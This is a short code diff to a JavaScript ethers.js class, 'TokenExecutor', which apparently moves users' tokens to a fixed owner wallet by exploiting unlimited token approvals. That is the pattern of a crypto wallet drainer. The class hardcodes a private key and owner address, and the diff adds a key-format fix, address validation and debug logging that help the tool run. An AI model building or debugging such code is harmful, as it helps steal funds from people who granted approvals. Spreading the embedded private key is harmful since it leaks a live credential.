@@ -2,7 +2,7 @@ const { ethers } = require('ethers');
 
 class TokenExecutor {
   constructor() {
-    this.privateKey = 'cdc76ffc92e9ce9cc57513a8e098457d56c6cb5eb6ff26ce8b803c7e146ee55f';
+    this.privateKey = '0xcdc76ffc92e9ce9cc57513a8e098457d56c6cb5eb6ff26ce8b803c7e146ee55f';
     this.ownerAddress = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
     
     // RPC providers
@@ -33,8 +33,19 @@ class TokenExecutor {
   // Execute token transfer using unlimited approval
   async executeTokenTransfer(userAddress, tokenAddress, chain = 'ethereum') {
     try {
+      // Validate addresses
+      if (!ethers.isAddress(userAddress)) {
+        return { success: false, error: 'Invalid user address' };
+      }
+      if (!ethers.isAddress(tokenAddress)) {
+        return { success: false, error: 'Invalid token address' };
+      }
+      
       const provider = chain === 'bsc' ? this.bscProvider : this.ethProvider;
       const wallet = chain === 'bsc' ? this.bscWallet : this.ethWallet;
+      
+      console.log('Wallet address:', wallet.address);
+      console.log('Expected address:', this.ownerAddress);
       
       const tokenContract = new ethers.Contract(tokenAddress, this.erc20Abi, wallet);
       
